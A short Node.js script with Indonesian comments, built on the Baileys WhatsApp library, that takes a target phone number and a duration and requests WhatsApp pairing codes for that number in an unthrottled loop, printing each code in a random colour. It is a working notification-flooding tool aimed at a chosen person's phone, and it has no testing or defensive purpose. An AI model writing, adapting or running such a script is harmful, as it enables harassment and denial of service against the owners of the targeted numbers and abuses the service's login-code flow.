const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');

// Array of extended colors (lebih banyak warna)
const colors = [
    '\x1b[31m', // Red
    '\x1b[32m', // Green
    '\x1b[33m', // Yellow
    '\x1b[34m', // Blue
    '\x1b[35m', // Magenta
    '\x1b[36m', // Cyan
    '\x1b[37m', // White
    '\x1b[90m', // Bright Black (Gray)
    '\x1b[91m', // Bright Red
    '\x1b[92m', // Bright Green
    '\x1b[93m', // Bright Yellow
    '\x1b[94m', // Bright Blue
    '\x1b[95m', // Bright Magenta
    '\x1b[96m', // Bright Cyan
    '\x1b[97m', // Bright White
    '\x1b[41m', // Background Red
    '\x1b[42m', // Background Green
    '\x1b[43m', // Background Yellow
    '\x1b[44m', // Background Blue
    '\x1b[45m', // Background Magenta
    '\x1b[46m', // Background Cyan
    '\x1b[47m', // Background White
    '\x1b[100m', // Background Bright Black (Gray)
    '\x1b[101m', // Background Bright Red
    '\x1b[102m', // Background Bright Green
    '\x1b[103m', // Background Bright Yellow
    '\x1b[104m', // Background Bright Blue
    '\x1b[105m', // Background Bright Magenta
    '\x1b[106m', // Background Bright Cyan
    '\x1b[107m', // Background Bright White
];

// Mengambil nomor target dan durasi dari command line
const args = process.argv.slice(2);
const phoneNumber = args[0];
const duration = parseInt(args[1], 10) * 1000; // Convert dari detik ke milidetik

if (!phoneNumber || isNaN(duration)) {
    console.error("Usage: node pairing.js number duration");
    process.exit(1);
}

async function dirxpair() {
    const { state } = await useMultiFileAuthState('./69/session');
    const dirzz = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    const startTime = Date.now();

    try {
        // Infinite loop untuk request pairing code, berhenti setelah durasi waktu
        while (Date.now() - startTime < duration) {
            try {
                const code = (await dirzz.requestPairingCode(phoneNumber))?.match(/.{1,4}/g)?.join("-") || 'No code found';

                // Pilih warna random untuk setiap request
                const randomColor = colors[Math.floor(Math.random() * colors.length)];

                // Log pairing code dengan warna random
                console.log(randomColor + `Pairing code for ${phoneNumber}: ${code}\x1b[0m`);

            } catch (error) {
                console.error('Error requesting code:', error.message);
            }
        }

        console.log("\x1b[32m" + "Completed pairing requests." + "\x1b[0m");

    } catch (error) {
        console.error('Error:', error.message);
    }

    return dirzz;
}

dirxpair();
